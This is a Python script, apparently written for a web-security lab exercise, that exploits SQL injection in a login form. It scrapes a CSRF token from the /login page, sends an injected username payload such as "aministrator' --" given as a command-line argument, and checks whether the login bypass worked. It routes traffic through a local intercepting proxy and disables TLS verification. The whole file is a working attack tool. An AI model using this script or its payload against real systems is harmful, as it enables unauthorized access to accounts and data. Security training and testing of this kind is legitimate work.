import requests
import urllib3
import sys
from bs4 import BeautifulSoup

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token (url,session):
    print("(+) Extracting the csrf token ...")
    response = session.get(url,verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_token = soup.find("input")["value"]
    
    print("(+) csrf token is \"%s\" " %csrf_token)

    return csrf_token



def exploit_sqli(url,payload,session):
    login_endpoint = "/login"
    print("(+) Trying to exploit SQLi..")

    params = {
        "csrf":get_csrf_token(url+login_endpoint, session),
        "username": payload,
        "password":"ayhaga",
    }

    response = session.post (url + login_endpoint , data=params,verify=False,proxies=proxies)

    if "Log out" in response.text  :
        print("(+) SQLi Exploitation Done successfully ..")
        
    else:
        print("(-) SQLi Exploitation  didn't Complete ..")


if __name__ == "__main__":
    try:
        url = sys.argv[1]
        payload = sys.argv[2]
        session = requests.Session()
        exploit_sqli(url,payload,session)
    except:

        print("(-) Usage: %s <url> <payload> " %sys.argv[0])
        print("(-) Example: %s https://www.example.com  \"aministrator' --\"" %sys.argv[0])
        sys.exit(-1)